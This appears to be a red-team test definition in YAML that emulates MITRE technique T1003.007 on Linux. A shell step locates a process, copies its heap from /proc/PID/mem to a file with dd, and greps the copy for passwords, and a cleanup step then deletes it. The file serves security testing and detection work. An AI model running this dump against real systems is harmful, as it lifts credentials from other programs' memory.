api_version: "2.0"
name: Dump individual process memory with sh (Local)
description: |
    Using `/proc/$PID/mem`, where $PID is the target process ID, use shell utilities to
    copy process memory to an external file so it can be searched or exfiltrated later.
args:
    - name: output_file
      type: path
      default: /tmp/T1003.007.bin
    - name: script_path
      type: path
      default: /tmp/T1003.007.sh
    - name: pid_term
      type: string
      default: T1003.007
uuid: 7e91138a-8e74-456d-a007-973d67a0bb80
mitre:
    tactics:
        - 'TA0006: Credential Access'
    techniques:
        - 'T1003: OS Credential Dumping'
    subtechniques:
        - 'T1003.007: Proc Filesystem'
requirements:
    platforms:
        - os: linux
steps:
    - name: dump-individual-process-memory-with-sh-(local)
      inline: |
        sh {{.Args.script_path}}
        PID=$(pgrep -n -f "{{.Args.pid_term}}")
        HEAP_MEM=$(grep -E "^[0-9a-f-]* r" /proc/"$PID"/maps | grep heap | cut -d' ' -f 1)
        MEM_START=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f1))))
        MEM_STOP=$(echo $((0x$(echo "$HEAP_MEM" | cut -d"-" -f2))))
        MEM_SIZE=$(echo $((0x$MEM_STOP-0x$MEM_START)))
        dd if=/proc/"${PID}"/mem of="{{.Args.output_file}}" ibs=1 skip="$MEM_START" count="$MEM_SIZE"
        grep -i "PASS" "{{.Args.output_file}}"
      executor: sh
      cleanup:
        inline: |
            rm -f "{{.Args.output_file}}"
        executor: sh
